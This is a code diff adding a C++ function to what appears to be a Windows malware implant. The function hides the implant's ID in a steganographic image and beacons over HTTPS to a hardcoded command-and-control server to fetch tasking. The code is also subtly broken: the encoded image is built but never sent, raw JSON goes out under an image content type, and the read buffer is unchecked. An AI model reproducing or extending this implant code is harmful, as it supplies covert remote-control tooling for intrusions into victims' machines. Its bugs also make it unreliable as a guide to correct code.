@@ -355,3 +355,122 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     return result;
 }
 
+std::string HttpGetCommandSteg(std::string uri, int implant_id, WCHAR* plainImagePath, WCHAR* encryptPath)
+{
+
+    // Used Windows documentation for every function
+    int temp = 0;
+    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
+    if (implant_id > 10)
+    {
+        temp = 2;
+    }
+    else
+    {
+        temp = 1;
+    }
+    int length = 7 + temp;
+    char postdata[11];
+    sprintf(postdata, "{\"id\":%d}", implant_id);
+    // createEncodedImage (WCHAR* plainPath, std::string message, WCHAR* encryptPath);
+    std::string encodeThis = std::string(postdata);
+    createEncodedImage(plainImagePath, encodeThis, encryptPath);
+    LPCWSTR additionalHeaders = L"Content-Type: image/png\r\n";
+
+    /* Converts from string to wstring to LPCWSTR
+       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
+    */
+    std::string result;
+    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
+    HINTERNET hSession = WinHttpOpen(L"HTTP", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+
+    if (!hSession)
+    {
+        return "WinHttpOpen Failed";
+    }
+
+    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
+    HINTERNET hConnect = WinHttpConnect(hSession, OURURL, 443, 0);
+
+    if (!hConnect)
+    {
+        WinHttpCloseHandle(hSession);
+        return "WinHttpConnect Failed";
+    }
+
+    // GET string for WinHttpOpenRequest
+    std::string get = "POST";
+    std::wstring get_wstring(get.begin(), get.end());
+    LPCWSTR getptr = get_wstring.c_str();
+
+    std::wstring get_uri(uri.begin(), uri.end());
+    LPCWSTR uriptr = get_uri.c_str();
+
+    // The WinHttpOpenRequest function creates an HTTP request handle.
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+
+    if (!hRequest)
+    {
+        WinHttpCloseHandle(hSession);
+        WinHttpCloseHandle(hConnect);
+        return "WinHttpOpenRequest Failed";
+    }
+    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);
+
+    // The WinHttpSendRequest function sends the specified request to the HTTP server.
+    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
+    {
+        WinHttpCloseHandle(hSession);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hRequest);
+        return "WinHttpSendRequest Failed";
+    }
+
+    if (!WinHttpReceiveResponse(hRequest, NULL))
+    {
+        WinHttpCloseHandle(hSession);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hRequest);
+        return "WinHttpReceiveResponse Failed";
+    }
+
+    DWORD lpdwNumberOfBytesAvailable = 0;
+    LPSTR lpBuffer = NULL;
+
+    do
+    {
+
+        lpdwNumberOfBytesAvailable = 0;
+
+        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
+        {
+            WinHttpCloseHandle(hSession);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hRequest);
+            return "WinHttpQueryDataAvailable Failed";
+        }
+
+        // Initializing Buffer with 4096 bytes
+        lpBuffer = new char[4096];
+        ZeroMemory(lpBuffer, 4096);
+
+        DWORD lpdwNumberOfBytesRead = 0;
+
+        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
+        {
+            WinHttpCloseHandle(hSession);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hRequest);
+            return "WinHttpReadData Failed";
+        }
+
+        result = result + lpBuffer;
+        delete[] lpBuffer;
+
+    } while (lpdwNumberOfBytesAvailable > 0);
+
+    WinHttpCloseHandle(hSession);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hRequest);
+    return result;
+}
